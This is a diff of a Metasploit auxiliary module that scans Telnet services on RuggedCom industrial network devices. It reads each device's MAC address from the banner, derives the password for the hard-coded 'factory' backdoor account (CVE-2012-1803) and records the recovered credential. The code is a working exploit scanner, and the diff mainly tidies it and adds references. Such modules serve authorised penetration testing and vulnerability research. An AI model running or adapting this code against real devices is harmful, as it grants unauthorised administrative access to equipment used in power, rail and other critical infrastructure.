@@ -1,3 +1,10 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+#   http://metasploit.com/framework/
+##
+
 require 'msf/core'
 
 class Metasploit3 < Msf::Auxiliary
@@ -6,30 +13,32 @@ class Metasploit3 < Msf::Auxiliary
 	include Msf::Auxiliary::Report
 	include Msf::Auxiliary::Scanner
 
-	def initialize
-		super(
+	def initialize(info = {})
+		super(update_info(info,
 			'Name'        => 'RuggedCom Telnet Password Generator',
-			'Version'     => '$Revision:$',
 			'Description' => %q{
-				This module will calculate the password for the hidden username "factory" in the RuggedCom Rugged Operating
-				System (ROS). The password is dynamically generated based on the devices MAC address.
-				Orignal exploit: http://www.exploit-db.com/exploits/18779/.
+				This module will calculate the password for the hard-coded hidden username
+				"factory" in the RuggedCom Rugged Operating System (ROS). The password is
+				dynamically generated based on the devices MAC address.
 			},
+			'References'     =>
+				[
+					[ 'CVE', '2012-1803' ],
+					[ 'EDB', '18779' ],
+					[ 'URL', 'http://www.kb.cert.org/vuls/id/889195' ]
+				],
 			'Author'      => ['Borja Merino <bmerinofe[at]gmail.com>'],
 			'License'     => MSF_LICENSE
-		)
+		))
+
 		register_options(
-		[
-			Opt::RPORT(23),
-			OptString.new('USERNAME', [ true, 'The username to authenticate as', 'factory']),
-			OptInt.new('TIMEOUT', [true, 'Timeout for the Telnet probe', 30])
-		], self.class)
+			[
+				Opt::RPORT(23),
+				OptString.new('USERNAME', [ true, 'The username to authenticate as', 'factory']),
+				OptInt.new('TIMEOUT', [true, 'Timeout for the Telnet probe', 30])
+			], self.class)
 	end
 
-	def to
-		return 30 if datastore['TIMEOUT'].to_i.zero?
-		datastore['TIMEOUT'].to_i
-	end
 
 	def mac_to_password(mac)
 		print_status ("MAC Address: #{mac}")
@@ -41,13 +50,16 @@ class Metasploit3 < Msf::Auxiliary
 		return pass.to_s
 	end
 
+
 	def get_info(banner)
 		product = banner.match(/Product:\s*\S*/)[0]
 		so_version = banner.match(/Rugged Operating System\s\S*/)[0]
 		return so_version << "  " << product
 	end
 
+
 	def run_host(ip)
+		to = (datastore['TIMEOUT'].zero?) ? 30 : datastore['TIMEOUT']
 		begin
 			::Timeout.timeout(to) do
 				res = connect
@@ -64,6 +76,7 @@ class Metasploit3 < Msf::Auxiliary
 						:user => 'factory',
 						:pass => password,
 						:source_type => "user_supplied",
+						:proof => info,
 						:active => true
 					)
 					break
@@ -71,13 +84,11 @@ class Metasploit3 < Msf::Auxiliary
 					print_status("It doesn't seem to be a RuggedCom service.")
 					break
 				end
-		end
+			end
 
 		rescue ::Rex::ConnectionError
 		rescue Timeout::Error
 			print_error("#{target_host}:#{rport}, Server timed out after #{to} seconds. Skipping.")
-		rescue ::Exception => e
-			print_error("#{e} #{e.backtrace}")
 		end
 	end
 end
